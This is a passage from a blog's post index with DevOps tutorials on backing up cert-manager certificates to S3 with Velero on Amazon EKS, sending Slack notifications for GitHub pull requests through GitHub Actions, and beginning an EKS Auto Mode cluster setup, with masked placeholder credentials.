\"2012-10-17\" Statement: - Effect: Allow Action: - s3:ListBucket - s3:GetBucketLocation - s3:ListBucketMultipartUploads Resource: !GetAtt S3Bucket.Arn - Effect: Allow Action: - s3:PutObject - s3:GetObject - s3:DeleteObject - s3:ListMultipartUploadParts - s3:AbortMultipartUpload Resource: !Sub \"arn:aws:s3:::${S3BucketName}/*\" # S3 Bucket policy does not deny HTTP requests - Sid: ForceSSLOnlyAccess Effect: Deny Action: \"s3:*\" Resource: - !Sub \"arn:${AWS::Partition}:s3:::${S3Bucket}\" - !Sub \"arn:${AWS::Partition}:s3:::${S3Bucket}/*\" Condition: Bool: aws:SecureTransport: \"false\" Outputs: S3PolicyArn: Description: The ARN of the created Amazon S3 policy Value: !Ref S3Policy S3Bucket: Description: The name of the created Amazon S3 bucket Value: !Ref S3Bucket EOF eval aws cloudformation deploy --capabilities CAPABILITY_NAMED_IAM \\ --parameter-overrides S3BucketName=\"${CLUSTER_FQDN}\" EmailToSubscribe=\"${MY_EMAIL}\" \\ --stack-name \"${CLUSTER_NAME}-s3\" --template-file \"${TMP_DIR}/${CLUSTER_FQDN}/aws-s3.yml\" --tags \"${TAGS//,/ }\" fi Install Velero Before installing Velero, you must create a Pod Identity Association to grant Velero the necessary permissions to access S3 and EC2 resources. The created velero ServiceAccount will be specified in the Velero Helm chart later. tee \"${TMP_DIR}/${CLUSTER_FQDN}/eksctl-${CLUSTER_NAME}-iam-podidentityassociations.yml\" &lt;&lt; EOF apiVersion: eksctl.io/v1alpha5 kind: ClusterConfig metadata: name: ${CLUSTER_NAME} region: ${AWS_REGION} iam: podIdentityAssociations: - namespace: velero serviceAccountName: velero roleName: eksctl-${CLUSTER_NAME}-pia-velero permissionPolicy: Version: \"2012-10-17\" Statement: - Effect: Allow Action: [ \"ec2:DescribeVolumes\", \"ec2:DescribeSnapshots\", \"ec2:CreateTags\", \"ec2:CreateSnapshot\", \"ec2:DeleteSnapshots\" ] Resource: - \"*\" - Effect: Allow Action: [ \"s3:GetObject\", \"s3:DeleteObject\", \"s3:PutObject\", \"s3:PutObjectTagging\", \"s3:AbortMultipartUpload\", \"s3:ListMultipartUploadParts\" ] Resource: - \"arn:aws:s3:::${CLUSTER_FQDN}/*\" - Effect: Allow Action: [ \"s3:ListBucket\", ] Resource: - \"arn:aws:s3:::${CLUSTER_FQDN}\" EOF eksctl create podidentityassociation --config-file \"${TMP_DIR}/${CLUSTER_FQDN}/eksctl-${CLUSTER_NAME}-iam-podidentityassociations.yml\" 2025-02-06 06:13:57 [‚Ñπ] 1 task: { 2 sequential sub-tasks: { create IAM role for pod identity association for service account \"velero/velero\", create pod identity association for service account \"velero/velero\", } }2025-02-06 06:13:58 [‚Ñπ] deploying stack \"eksctl-k01-podidentityrole-velero-velero\" 2025-02-06 06:13:58 [‚Ñπ] waiting for CloudFormation stack \"eksctl-k01-podidentityrole-velero-velero\" 2025-02-06 06:14:28 [‚Ñπ] waiting for CloudFormation stack \"eksctl-k01-podidentityrole-velero-velero\" 2025-02-06 06:15:26 [‚Ñπ] waiting for CloudFormation stack \"eksctl-k01-podidentityrole-velero-velero\" 2025-02-06 06:15:27 [‚Ñπ] created pod identity association for service account \"velero\" in namespace \"velero\" 2025-02-06 06:15:27 [‚Ñπ] all tasks were completed successfully Install the velero Helm chart and modify its default values: # renovate: datasource=helm depName=velero registryUrl=https://vmware-tanzu.github.io/helm-charts VELERO_HELM_CHART_VERSION=\"8.3.0\" helm repo add --force-update vmware-tanzu https://vmware-tanzu.github.io/helm-charts cat &gt; \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-velero.yml\" &lt;&lt; EOF initContainers: - name: velero-plugin-for-aws # renovate: datasource=docker depName=velero/velero-plugin-for-aws extractVersion=^(?&lt;version&gt;.+)$ image: velero/velero-plugin-for-aws:v1.11.1 volumeMounts: - mountPath: /target name: plugins metrics: serviceMonitor: enabled: true prometheusRule: enabled: true spec: - alert: VeleroBackupPartialFailures annotations: message: Velero backup {{ \\$labels.schedule }} has {{ \\$value | humanizePercentage }} partially failed backups. expr: velero_backup_partial_failure_total{schedule!=\"\"} / velero_backup_attempt_total{schedule!=\"\"} &gt; 0.25 for: 15m labels: severity: warning - alert: VeleroBackupFailures annotations: message: Velero backup {{ \\$labels.schedule }} has {{ \\$value | humanizePercentage }} failed backups. expr: velero_backup_failure_total{schedule!=\"\"} / velero_backup_attempt_total{schedule!=\"\"} &gt; 0.25 for: 15m labels: severity: warning - alert: VeleroBackupSnapshotFailures annotations: message: Velero backup {{ \\$labels.schedule }} has {{ \\$value | humanizePercentage }} failed snapshot backups. expr: increase(velero_volume_snapshot_failure_total{schedule!=\"\"}[1h]) &gt; 0 for: 15m labels: severity: warning - alert: VeleroRestorePartialFailures annotations: message: Velero restore {{ \\$labels.schedule }} has {{ \\$value | humanizePercentage }} partially failed restores. expr: increase(velero_restore_partial_failure_total{schedule!=\"\"}[1h]) &gt; 0 for: 15m labels: severity: warning - alert: VeleroRestoreFailures annotations: message: Velero restore {{ \\$labels.schedule }} has {{ \\$value | humanizePercentage }} failed restores. expr: increase(velero_restore_failure_total{schedule!=\"\"}[1h]) &gt; 0 for: 15m labels: severity: warning configuration: backupStorageLocation: - name: provider: aws bucket: ${CLUSTER_FQDN} prefix: velero config: region: ${AWS_DEFAULT_REGION} volumeSnapshotLocation: - name: provider: aws config: region: ${AWS_DEFAULT_REGION} serviceAccount: server: name: velero credentials: useSecret: false # Create scheduled backup to periodically backup the let's encrypt production resources in the \"cert-manager\" namespace: schedules: monthly-backup-cert-manager-production: labels: letsencrypt: production schedule: \"@monthly\" template: ttl: 2160h includeClusterResources: true includedNamespaces: - cert-manager includedResources: - certificates.cert-manager.io - clusterissuers.cert-manager.io - secrets labelSelector: matchLabels: letsencrypt: production EOF helm upgrade --install --version \"${VELERO_HELM_CHART_VERSION}\" --namespace velero --create-namespace --wait --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-velero.yml\" velero vmware-tanzu/velero Add the Velero Grafana dashboard for enhanced monitoring and visualization: # renovate: datasource=helm depName=kube-prometheus-stack registryUrl=https://prometheus-community.github.io/helm-charts KUBE_PROMETHEUS_STACK_HELM_CHART_VERSION=\"67.9.0\" cat &gt; \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-kube-prometheus-stack-velero-cert-manager.yml\" &lt;&lt; EOF grafana: dashboards: default: 15469-kubernetes-addons-velero-stats: # renovate: depName=\"Velero Exporter Overview\" gnetId: 15469 revision: 1 datasource: Prometheus EOF helm upgrade --install --version \"${KUBE_PROMETHEUS_STACK_HELM_CHART_VERSION}\" --namespace kube-prometheus-stack --reuse-values --wait --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-kube-prometheus-stack-velero-cert-manager.yml\" kube-prometheus-stack prometheus-community/kube-prometheus-stack Backup cert-manager objects These steps should be done only once. Verify that the backup-location is set properly to AWS S3 and is available: velero get backup-location NAME PROVIDER BUCKET/PREFIX PHASE LAST VALIDATED ACCESS MODE DEFAULT default aws k01.k8s.mylabs.dev/velero Available 2025-02-06 06:21:59 +0100 CET ReadWrite true Initiate the backup process and store the required cert-manager objects in S3. if ! aws s3 ls \"s3://${CLUSTER_FQDN}/velero/backups/\" | grep -q velero-monthly-backup-cert-manager-production; then velero backup create --labels letsencrypt=production --ttl 2160h --from-schedule velero-monthly-backup-cert-manager-production --wait fi Check the backup details: velero backup describe --selector letsencrypt=production --details Name: velero-monthly-backup-cert-manager-production-20250206052506 Namespace: velero Labels: app.kubernetes.io/instance=velero app.kubernetes.io/managed-by=Helm app.kubernetes.io/name=velero helm.sh/chart=velero-8.3.0 letsencrypt=production velero.io/schedule-name=velero-monthly-backup-cert-manager-production velero.io/storage-location=default Annotations: meta.helm.sh/release-name=velero meta.helm.sh/release-namespace=velero velero.io/resource-timeout=10m0s velero.io/source-cluster-k8s-gitversion=v1.30.9-eks-8cce635 velero.io/source-cluster-k8s-major-version=1 velero.io/source-cluster-k8s-minor-version=30+ Phase: Completed Namespaces: Included: cert-manager Excluded: &lt;none&gt; Resources: Included: certificates.cert-manager.io, secrets Excluded: &lt;none&gt; Cluster-scoped: auto Label selector: letsencrypt=production Or label selector: &lt;none&gt; Storage Location: default Velero-Native Snapshot PVs: auto Snapshot Move Data: false Data Mover: velero TTL: 2160h0m0s CSISnapshotTimeout: 10m0s ItemOperationTimeout: 4h0m0s Hooks: &lt;none&gt; Backup Format Version: 1.1.0 Started: 2025-02-06 06:25:06 +0100 CET Completed: 2025-02-06 06:25:08 +0100 CET Expiration: 2025-05-07 07:25:06 +0200 CEST Total items to be backed up: 6 Items backed up: 6 Resource List: apiextensions.k8s.io/v1/CustomResourceDefinition: - certificates.cert-manager.io - clusterissuers.cert-manager.io cert-manager.io/v1/Certificate: - cert-manager/ingress-cert-production cert-manager.io/v1/ClusterIssuer: - letsencrypt-production-dns v1/Secret: - cert-manager/ingress-cert-production - cert-manager/letsencrypt-production-dns Backup Volumes: Velero-Native Snapshots: &lt;none included&gt; CSI Snapshots: &lt;none included&gt; Pod Volume Backups: &lt;none included&gt; HooksAttempted: 0 HooksFailed: 0 List the files in the S3 bucket: aws s3 ls --recursive \"s3://${CLUSTER_FQDN}/velero/backups\" 2025-02-06 06:25:09 4276 velero/backups/velero-monthly-backup-cert-manager-production-20250206052506/velero-backup.json 2025-02-06 06:25:08 29 velero/backups/velero-monthly-backup-cert-manager-production-20250206052506/velero-monthly-backup-cert-manager-production-20250206052506-csi-volumesnapshotclasses.json.gz 2025-02-06 06:25:08 29 velero/backups/velero-monthly-backup-cert-manager-production-20250206052506/velero-monthly-backup-cert-manager-production-20250206052506-csi-volumesnapshotcontents.json.gz 2025-02-06 06:25:08 29 velero/backups/velero-monthly-backup-cert-manager-production-20250206052506/velero-monthly-backup-cert-manager-production-20250206052506-csi-volumesnapshots.json.gz 2025-02-06 06:25:08 27 velero/backups/velero-monthly-backup-cert-manager-production-20250206052506/velero-monthly-backup-cert-manager-production-20250206052506-itemoperations.json.gz 2025-02-06 06:25:08 3049 velero/backups/velero-monthly-backup-cert-manager-production-20250206052506/velero-monthly-backup-cert-manager-production-20250206052506-logs.gz 2025-02-06 06:25:08 29 velero/backups/velero-monthly-backup-cert-manager-production-20250206052506/velero-monthly-backup-cert-manager-production-20250206052506-podvolumebackups.json.gz 2025-02-06 06:25:08 121 velero/backups/velero-monthly-backup-cert-manager-production-20250206052506/velero-monthly-backup-cert-manager-production-20250206052506-resource-list.json.gz 2025-02-06 06:25:08 49 velero/backups/velero-monthly-backup-cert-manager-production-20250206052506/velero-monthly-backup-cert-manager-production-20250206052506-results.gz 2025-02-06 06:25:08 27 velero/backups/velero-monthly-backup-cert-manager-production-20250206052506/velero-monthly-backup-cert-manager-production-20250206052506-volumeinfo.json.gz 2025-02-06 06:25:08 29 velero/backups/velero-monthly-backup-cert-manager-production-20250206052506/velero-monthly-backup-cert-manager-production-20250206052506-volumesnapshots.json.gz 2025-02-06 06:25:08 8379 velero/backups/velero-monthly-backup-cert-manager-production-20250206052506/velero-monthly-backup-cert-manager-production-20250206052506.tar.gz Restore cert-manager objects The following steps will guide you through restoring a Let‚Äôs Encrypt production certificate, previously backed up by Velero to S3, onto a new cluster. Initiate the restore process for the cert-manager objects. velero restore create --from-schedule velero-monthly-backup-cert-manager-production --labels letsencrypt=production --wait --existing-resource-policy=update View details about the restore process: velero restore describe --selector letsencrypt=production --details Name: velero-monthly-backup-cert-manager-production-20250206055911 Namespace: velero Labels: letsencrypt=production Annotations: &lt;none&gt; Phase: Completed Total items to be restored: 6 Items restored: 6 Started: 2025-02-06 06:59:12 +0100 CET Completed: 2025-02-06 06:59:13 +0100 CET Backup: velero-monthly-backup-cert-manager-production-20250206052506 Namespaces: Included: all namespaces found in the backup Excluded: &lt;none&gt; Resources: Included: * Excluded: nodes, events, events.events.k8s.io, backups.velero.io, restores.velero.io, resticrepositories.velero.io, csinodes.storage.k8s.io, volumeattachments.storage.k8s.io, backuprepositories.velero.io Cluster-scoped: auto Namespace mappings: &lt;none&gt; Label selector: &lt;none&gt; Or label selector: &lt;none&gt; Restore PVs: auto CSI Snapshot Restores: &lt;none included&gt; Existing Resource Policy: update ItemOperationTimeout: 4h0m0s Preserve Service NodePorts: auto Uploader config: HooksAttempted: 0 HooksFailed: 0 Resource List: apiextensions.k8s.io/v1/CustomResourceDefinition: - certificates.cert-manager.io(updated) - clusterissuers.cert-manager.io(updated) cert-manager.io/v1/Certificate: - cert-manager/ingress-cert-production(created) cert-manager.io/v1/ClusterIssuer: - letsencrypt-production-dns(updated) v1/Secret: - cert-manager/ingress-cert-production(created) - cert-manager/letsencrypt-production-dns(updated) Verify that the certificate was restored properly: kubectl describe certificates -n cert-manager ingress-cert-production Name: ingress-cert-production Namespace: cert-manager Labels: letsencrypt=production velero.io/backup-name=velero-monthly-backup-cert-manager-production-20250206052506 velero.io/restore-name=velero-monthly-backup-cert-manager-production-20250206055911 Annotations: &lt;none&gt; API Version: cert-manager.io/v1 Kind: Certificate Metadata: Creation Timestamp: 2025-02-06T05:59:13Z Generation: 1 Resource Version: 7903 UID: a7adee5e-82b7-4849-aac6-aa33298a9268 Spec: Common Name: *.k01.k8s.mylabs.dev Dns Names: *.k01.k8s.mylabs.dev k01.k8s.mylabs.dev Issuer Ref: Kind: ClusterIssuer Name: letsencrypt-production-dns Secret Name: ingress-cert-production Secret Template: Labels: Letsencrypt: production Status: Conditions: Last Transition Time: 2025-02-06T05:59:13Z Message: Certificate is up to date and has not expired Observed Generation: 1 Reason: Ready Status: True Type: Ready Not After: 2025-05-07T04:13:10Z Not Before: 2025-02-06T04:13:11Z Renewal Time: 2025-04-07T04:13:10Z Events: &lt;none&gt; Reconfigure ingress-nginx The previous steps restored the Let‚Äôs Encrypt production certificate (cert-manager/ingress-cert-production). Now, let‚Äôs configure ingress-nginx to use this certificate. First, check the current ‚Äústaging‚Äù certificate; this will be replaced by the production certificate: while ! curl -sk \"https://${CLUSTER_FQDN}\" &gt; /dev/null; do date sleep 5 done openssl s_client -connect \"${CLUSTER_FQDN}:443\" &lt; /dev/null depth=1 C=US, O=(STAGING) Let's Encrypt, CN=(STAGING) Wannabe Watercress R11 verify error:num=20:unable to get local issuer certificate verify return:1 depth=0 CN=*.k01.k8s.mylabs.dev verify return:1 --- Certificate chain 0 s:CN=*.k01.k8s.mylabs.dev i:C=US, O=(STAGING) Let's Encrypt, CN=(STAGING) Wannabe Watercress R11 a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA256 v:NotBefore: Feb 6 04:56:23 2025 GMT; NotAfter: May 7 04:56:22 2025 GMT 1 s:C=US, O=(STAGING) Let's Encrypt, CN=(STAGING) Wannabe Watercress R11 i:C=US, O=(STAGING) Internet Security Research Group, CN=(STAGING) Pretend Pear X1 a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA256 v:NotBefore: Mar 13 00:00:00 2024 GMT; NotAfter: Mar 12 23:59:59 2027 GMT --- Server certificate -----BEGIN CERTIFICATE----- ... ... ... -----END CERTIFICATE----- subject=CN=*.k01.k8s.mylabs.dev issuer=C=US, O=(STAGING) Let's Encrypt, CN=(STAGING) Wannabe Watercress R11 --- No client certificate CA names sent Peer signing digest: SHA256 Peer signature type: RSA-PSS Server Temp Key: X25519, 253 bits --- SSL handshake has read 3270 bytes and written 409 bytes Verification error: unable to get local issuer certificate --- New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384 Protocol: TLSv1.3 Server public key is 2048 bit This TLS version forbids renegotiation. Compression: NONE Expansion: NONE No ALPN negotiated Early data was not sent Verify return code: 20 (unable to get local issuer certificate) --- DONE Configure ingress-nginx to use the production Let‚Äôs Encrypt certificate. # renovate: datasource=helm depName=ingress-nginx registryUrl=https://kubernetes.github.io/ingress-nginx INGRESS_NGINX_HELM_CHART_VERSION=\"4.12.3\" cat &gt; \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-ingress-nginx-production-certs.yml\" &lt;&lt; EOF controller: extraArgs: default-ssl-certificate: cert-manager/ingress-cert-production EOF helm upgrade --install --version \"${INGRESS_NGINX_HELM_CHART_VERSION}\" --namespace ingress-nginx --reuse-values --wait --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-ingress-nginx-production-certs.yml\" ingress-nginx ingress-nginx/ingress-nginx The production certificate should now be active and in use. while ! curl -sk \"https://${CLUSTER_FQDN}\" &gt; /dev/null; do date sleep 5 done openssl s_client -connect \"${CLUSTER_FQDN}:443\" &lt; /dev/null depth=2 C=US, O=Internet Security Research Group, CN=ISRG Root X1 verify return:1 depth=1 C=US, O=Let's Encrypt, CN=R10 verify return:1 depth=0 CN=*.k01.k8s.mylabs.dev verify return:1 --- Certificate chain 0 s:CN=*.k01.k8s.mylabs.dev i:C=US, O=Let's Encrypt, CN=R10 a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA256 v:NotBefore: Feb 6 04:13:11 2025 GMT; NotAfter: May 7 04:13:10 2025 GMT 1 s:C=US, O=Let's Encrypt, CN=R10 i:C=US, O=Internet Security Research Group, CN=ISRG Root X1 a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA256 v:NotBefore: Mar 13 00:00:00 2024 GMT; NotAfter: Mar 12 23:59:59 2027 GMT --- Server certificate -----BEGIN CERTIFICATE----- ... ... ... -----END CERTIFICATE----- subject=CN=*.k01.k8s.mylabs.dev issuer=C=US, O=Let's Encrypt, CN=R10 --- No client certificate CA names sent Peer signing digest: SHA256 Peer signature type: RSA-PSS Server Temp Key: X25519, 253 bits --- SSL handshake has read 3149 bytes and written 409 bytes Verification: OK --- New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384 Protocol: TLSv1.3 Server public key is 2048 bit This TLS version forbids renegotiation. Compression: NONE Expansion: NONE No ALPN negotiated Early data was not sent Verify return code: 0 (ok) --- DONE Here is the report from SSL Labs: Examine the certificate details: kubectl describe certificates -n cert-manager ingress-cert-production Name: ingress-cert-production Namespace: cert-manager Labels: letsencrypt=production velero.io/backup-name=velero-monthly-backup-cert-manager-production-20250206052506 velero.io/restore-name=velero-monthly-backup-cert-manager-production-20250206055911 Annotations: &lt;none&gt; API Version: cert-manager.io/v1 Kind: Certificate Metadata: Creation Timestamp: 2025-02-06T05:59:13Z Generation: 1 Resource Version: 7903 UID: a7adee5e-82b7-4849-aac6-aa33298a9268 Spec: Common Name: *.k01.k8s.mylabs.dev Dns Names: *.k01.k8s.mylabs.dev k01.k8s.mylabs.dev Issuer Ref: Kind: ClusterIssuer Name: letsencrypt-production-dns Secret Name: ingress-cert-production Secret Template: Labels: Letsencrypt: production Status: Conditions: Last Transition Time: 2025-02-06T05:59:13Z Message: Certificate is up to date and has not expired Observed Generation: 1 Reason: Ready Status: True Type: Ready Not After: 2025-05-07T04:13:10Z Not Before: 2025-02-06T04:13:11Z Renewal Time: 2025-04-07T04:13:10Z Events: &lt;none&gt; Clean-up Back up the certificate before deleting the cluster (in case it was renewed): if [[ \"$(kubectl get --raw /api/v1/namespaces/cert-manager/services/cert-manager:9402/proxy/metrics | awk '/certmanager_http_acme_client_request_count.*acme-v02\\.api.*finalize/ { print $2 }')\" -gt 0 ]]; then velero backup create --labels letsencrypt=production --ttl 2160h --from-schedule velero-monthly-backup-cert-manager-production fi Remove files from the ${TMP_DIR}/${CLUSTER_FQDN} directory: for FILE in \"${TMP_DIR}/${CLUSTER_FQDN}\"/{aws-s3,eksctl-${CLUSTER_NAME}-iam-podidentityassociations,helm_values-{ingress-nginx-production-certs,kube-prometheus-stack-velero-cert-manager,velero},k8s-cert-manager-{clusterissuer,certificate}-production}.yml; do if [[ -f \"${FILE}\" ]]; then rm -v \"${FILE}\" else echo \"*** File not found: ${FILE}\" fi done Enjoy ‚Ä¶ üòâ" }, { "title": "Slack notification for GitHub Pull Requests with status updates", "url": "/posts/slack-notification-pull-request/", "categories": "GitHub, GitHub Actions, Slack, notification, Pull Request", "tags": "GitHub, notifications, GitHub Actions, Pull Request", "date": "2025-01-26 00:00:00 +0100", "content": "When working on code and collaborating with teammates, setting up Slack notifications for new GitHub Pull Requests can be helpful. This is a widely recognized best practice, and many people use the slack-github-action to implement it. However, using Slack reactions for Pull Request updates is less common. Here‚Äôs a screencast demonstrating what the Slack notification with status updates looks like: In this article, I will walk you through setting up Slack notifications for GitHub Pull Requests, including status updates, using GitHub Actions. Requirements First, create GitHub Action secrets named MY_SLACK_BOT_TOKEN and MY_SLACK_CHANNEL_ID. Detailed instructions for this can be found in the slack-github-action repository. Next, create a new GitHub Action workflow file named .github/workflows/pr-slack-notification.yml with the following content. name: pr-slack-notification # Based on: https://github.com/slackapi/slack-github-action/issues/269 # Description: https://ruzickap.github.io/posts/slack-notification-pull-request/ on: workflow_dispatch: pull_request: types: - opened - ready_for_review - review_requested - closed issue_comment: types: - created pull_request_review: types: - submitted permissions: read-all defaults: run: shell: bash -euxo pipefail {0} jobs: debug: runs-on: ubuntu-latest steps: - name: Debug env: GITHUB_CONTEXT: ${{ toJson(github) }} run: | echo \"${GITHUB_CONTEXT}\" pr-slack-notification: runs-on: ubuntu-latest name: Sends a message to Slack when a PR is opened if: (github.event.action == 'opened' &amp;&amp; github.event.pull_request.draft == false) || github.event.action == 'ready_for_review' steps: - name: Post PR summary message to slack id: message uses: slackapi/slack-github-action@485a9d42d3a73031f12ec201c457e2162c45d02d # v2.0.0 with: method: chat.postMessage token: ${{ secrets.MY_SLACK_BOT_TOKEN }} payload: | channel: ${{ secrets.MY_SLACK_CHANNEL_ID }} text: \"üí° *${{ github.event.pull_request.user.login }}*: &lt;${{ github.event.pull_request.html_url }}|#${{ github.event.pull_request.number }} - ${{ github.event.pull_request.title }}&gt; (+${{ github.event.pull_request.additions }}, -${{ github.event.pull_request.deletions }})\" - name: Create file with slack message timestamp run: | echo \"${{ steps.message.outputs.ts }}\" &gt; slack-message-timestamp.txt - name: Cache slack message timestamp uses: actions/cache/save@1bd1e32a3bdc45362d1e726936510720a7c30a57 # v4.2.0 with: path: slack-message-timestamp.txt key: slack-message-timestamp-${{ github.event.pull_request.html_url }}-${{ steps.message.outputs.ts }} slack-emoji-react: runs-on: ubuntu-latest name: Adds emoji reaction to slack message when a PR is closed or reviewed if: ${{ startsWith(github.event.pull_request.html_url, 'https') || startsWith(github.event.issue.pull_request.html_url, 'https') }} steps: # gh commands needs to be executed in the repository - name: Checkout Code uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2 # https://stackoverflow.com/questions/74640750/github-actions-not-finding-cache # I can not use the cache action in this job because the cache is not shared between runs - name: Save slack timestamp as an environment variable id: slack-timestamp env: GH_TOKEN: ${{ secrets.GITHUB_TOKEN }} run: | SLACK_TIMESTAMP=$(gh cache list --json key --jq '.[].key|capture(\"${{ github.event.pull_request.html_url || github.event.issue.pull_request.html_url }}-(?&lt;x&gt;.+)\").x') echo \"SLACK_TIMESTAMP=${SLACK_TIMESTAMP}\" | tee -a \"${GITHUB_ENV}\" if [[ \"${SLACK_TIMESTAMP}\" != '' ]]; then echo \"github_event_pull_request_html_url=true\" &gt;&gt; \"${GITHUB_OUTPUT}\" fi - name: Decide which emoji to add if: ${{ steps.slack-timestamp.outputs.github_event_pull_request_html_url == 'true' }} run: | case \"${{ github.event.action }}\" in created) if [[ \"${{ github.event_name }}\" == 'issue_comment' ]]; then echo \"EMOJI=speech_balloon\" &gt;&gt; \"${GITHUB_ENV}\" # üí¨ fi ;; submitted) case \"${{ github.event.review.state }}\" in changes_requested) echo \"EMOJI=repeat\" &gt;&gt; \"${GITHUB_ENV}\" # üîÅ ;; approved) echo \"EMOJI=ok\" &gt;&gt; \"${GITHUB_ENV}\" # üÜó ;; commented) echo \"EMOJI=speech_balloon\" &gt;&gt; \"${GITHUB_ENV}\" # üí¨ ;; esac ;; review_requested) echo \"EMOJI=eyes\" &gt;&gt; \"${GITHUB_ENV}\" # üëÄ ;; *) echo \"EMOJI=false\" &gt;&gt; \"${GITHUB_ENV}\" ;; esac - name: React to PR summary message in slack with emoji if: ${{ steps.slack-timestamp.outputs.github_event_pull_request_html_url == 'true' &amp;&amp; env.EMOJI != 'false' }} uses: slackapi/slack-github-action@485a9d42d3a73031f12ec201c457e2162c45d02d # v2.0.0 with: method: reactions.add token: ${{ secrets.MY_SLACK_BOT_TOKEN }} payload: | channel: ${{ secrets.MY_SLACK_CHANNEL_ID }} timestamp: \"${{ env.SLACK_TIMESTAMP }}\" name: ${{ env.EMOJI }} - name: Update the original message with success if: ${{ github.event.pull_request.merged &amp;&amp; steps.slack-timestamp.outputs.github_event_pull_request_html_url == 'true' }} uses: slackapi/slack-github-action@v2.0.0 with: method: chat.update token: ${{ secrets.MY_SLACK_BOT_TOKEN }} payload: | channel: ${{ secrets.MY_SLACK_CHANNEL_ID }} ts: \"${{ env.SLACK_TIMESTAMP }}\" text: \"‚úÖ *${{ github.event.pull_request.user.login }}*: &lt;${{ github.event.pull_request.html_url }}|#${{ github.event.pull_request.number }} - ${{ github.event.pull_request.title }}&gt; (+${{ github.event.pull_request.additions }}, -${{ github.event.pull_request.deletions }})\" attachments: - color: \"28a745\" fields: - title: \"Status\" short: true value: \"Merged ‚úÖ\" Description The workflow file defines two jobs: pr-slack-notification and slack-emoji-react. The pr-slack-notification job sends a message to Slack when a Pull Request is opened or marked as ready for review. The slack-emoji-react job adds an emoji reaction to the Slack message when a Pull Request is closed or reviewed. This job also updates the original message with a success indicator when the Pull Request is merged. The Slack message ‚Äúemoji‚Äù updates cover the following scenarios: üí¨ - a new comment is added to the pull request through either a ‚ÄúPull Request Comment‚Äù or a ‚ÄúReview Changes Comment‚Äù üîÅ - the reviewer has requested changes üÜó - the reviewer has approved the Pull Request üëÄ - The Pull Request owner has requested the reviewer to review the Pull Request ‚úÖ - The Pull Request has been merged The screencast above showcases some of these actions. The GitHub Action workflow code and its description may change in the future. The latest version of the code can be found here: pr-slack-notification.yml Enjoy ‚Ä¶ üòâ" }, { "title": "Build secure and cheap Amazon EKS Auto Mode", "url": "/posts/secure-cheap-amazon-eks-auto/", "categories": "Kubernetes, Amazon EKS Auto Mode, Security", "tags": "amazon eks, amaozn eks auto mode, k8s, kubernetes, security, eksctl, cert-manager, external-dns, prometheus, sso, oauth2-proxy", "date": "2024-12-14 00:00:00 +0100", "content": "I will outline the steps for setting up an Amazon EKS Auto Mode environment that is both cost-effective and prioritizes security, including the configuration of standard applications. The Amazon EKS Auto Mode setup should align with the following cost-effectiveness criteria: Utilize two Availability Zones (AZs), or a single zone if possible, to reduce payments for cross-AZ traffic Spot instances Less expensive region - us-east-1 Most price efficient EC2 instance type t4g.medium (2 x CPU, 4GB RAM) using AWS Graviton based on ARM Use Bottlerocket OS for a minimal operating system, CPU, and memory footprint Use Network Load Balancer (NLB) as a most cost efficient + cost optimized load balancer Karpenter to enable automatic node scaling that matches the specific resource requirements of pods The Amazon EKS Auto Mode setup should also meet the following security requirements: The Amazon EKS Auto Mode control plane must be encrypted using KMS Worker node EBS volumes must be encrypted Cluster logging to CloudWatch must be configured Build Amazon EKS Auto Mode Requirements You will need to configure the AWS CLI and set up other necessary secrets and variables. # AWS Credentials export AWS_ACCESS_KEY_ID=\"xxxxxxxxxxxxxxxxxx\" export AWS_SECRET_ACCESS_KEY=\"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\" export AWS_SESSION_TOKEN=\"xxxxxxxx\" export AWS_ROLE_TO_ASSUME=\"arn:aws:iam::7xxxxxxxxxx7:role/Gixxxxxxxxxxxxxxxxxxxxle\" export GOOGLE_CLIENT_ID=\"10xxxxxxxxxxxxxxxud.apps.googleusercontent.com\" export GOOGLE_CLIENT_SECRET=\"GOxxxxxxxxxxxxxxxtw\" If you plan to follow this document and its tasks, you will need to set up a few environment variables, such as: # AWS Region export AWS_REGION=\"${AWS_REGION:-us-east-1}\" # Hostname / FQDN definitions export CLUSTER_FQDN=\"${CLUSTER_FQDN:-k01.k8s.mylabs.dev}\" # Base Domain: k8s.mylabs.dev export BASE_DOMAIN=\"${CLUSTER_FQDN#*.}\" # Cluster Name: k01 export CLUSTER_NAME=\"${CLUSTER_FQDN%%.*}\" export MY_EMAIL=\"petr.ruzicka@gmail.com\" export TMP_DIR=\"${TMP_DIR:-${PWD}}\" export KUBECONFIG=\"${KUBECONFIG:-${TMP_DIR}/${CLUSTER_FQDN}/kubeconfig-${CLUSTER_NAME}.conf}\" # Tags used to tag the AWS resources export TAGS=\"${TAGS:-Owner=${MY_EMAIL},Environment=dev,Cluster=${CLUSTER_FQDN}}\" export AWS_PARTITION=\"aws\" AWS_ACCOUNT_ID=$(aws sts get-caller-identity --query \"Account\" --output text) &amp;&amp; export AWS_ACCOUNT_ID mkdir -pv \"${TMP_DIR}/${CLUSTER_FQDN}\" Confirm that all essential variables have been properly configured: : \"${AWS_ACCESS_KEY_ID?}\" : \"${AWS_REGION?}\" : \"${AWS_SECRET_ACCESS_KEY?}\" : \"${AWS_ROLE_TO_ASSUME?}\" : \"${GOOGLE_CLIENT_ID?}\" : \"${GOOGLE_CLIENT_SECRET?}\" echo -e \"${MY_EMAIL} | ${CLUSTER_NAME} | ${BASE_DOMAIN} | ${CLUSTER_FQDN}\\n${TAGS}\" Install the required tools: You can bypass these procedures if you already have all the essential software installed. AWS CLI eksctl kubectl helm Configure AWS Route 53 Domain delegation The DNS delegation tasks should be executed as a one-time operation. Create a DNS zone for the EKS clusters: export CLOUDFLARE_EMAIL=\"petr.ruzicka@gmail.com\" export CLOUDFLARE_API_KEY=\"1xxxxxxxxx0\" aws route53 create-hosted-zone --output json \\ --name \"${BASE_DOMAIN}\" \\ --caller-reference \"$(date)\" \\ 